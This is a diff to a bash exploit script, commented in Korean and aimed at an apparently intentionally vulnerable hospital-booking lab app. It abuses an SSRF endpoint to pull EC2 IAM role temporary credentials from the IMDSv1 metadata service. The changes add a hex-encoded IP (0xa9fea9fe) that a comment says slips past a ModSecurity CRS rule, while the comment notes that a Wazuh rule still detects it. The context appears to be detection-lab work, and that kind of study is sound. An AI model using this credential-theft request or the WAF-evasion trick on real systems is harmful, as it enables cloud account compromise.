@@ -1,7 +1,8 @@
 #!/usr/bin/env bash
 # SSRF -> IMDSv1 -> EC2 role 임시 자격증명 탈취 스크립트 (WSL/bash용)
 #
-# vuln-hospital-booking의 /api/documents/referral-link-preview 엔드포인트가
+# vuln-hospital-booking의 /api/documents/referral-attachment-import 엔드포인트가
+# (전원 접수 시 의뢰 병원이 제공한 의뢰서 원본 문서 URL을 가져오는 기능)
 # 로그인한 사용자가 넘긴 url을 서버에서 그대로 requests.get()하는 SSRF를
 # 이용해서, EC2 인스턴스 메타데이터(IMDSv1, 토큰 불필요)에서 IAM 역할의
 # 임시 자격증명을 읽어온다.
@@ -40,12 +41,16 @@ if [ "$LOGIN_STATUS" != "302" ]; then
 fi
 
 # 2. SSRF로 IMDS에서 자격증명 JSON 가져오기
-IMDS_URL="http://169.254.169.254/latest/meta-data/iam/security-credentials/${ROLE_NAME}"
+# 169.254.169.254를 원문 그대로 쓰면 ModSecurity CRS 931100(ARGS:url의 dotted-decimal
+# IP 패턴 탐지, REQUEST-931-APPLICATION-ATTACK-RFI.conf)에 걸려 WAF가 403으로 막는다.
+# 16진수 표기(0xa9fea9fe)로 난독화하면 CRS 정규식은 피하면서, Wazuh local_rules.xml의
+# 100011은 이 우회까지 커버하도록 설계돼 있어 그대로 탐지된다.
+IMDS_URL="http://0xa9fea9fe/latest/meta-data/iam/security-credentials/${ROLE_NAME}"
 log "SSRF 경유로 IMDS 조회: $IMDS_URL"
 
 RESPONSE=$(curl -s -b "$COOKIE_JAR" -G \
   --data-urlencode "url=$IMDS_URL" \
-  "$BASE_URL/api/documents/referral-link-preview")
+  "$BASE_URL/api/documents/referral-attachment-import")
 
 # content 필드(문자열로 이스케이프된 IMDS JSON 원문)만 추출
 CREDS_JSON=$(python3 -c '
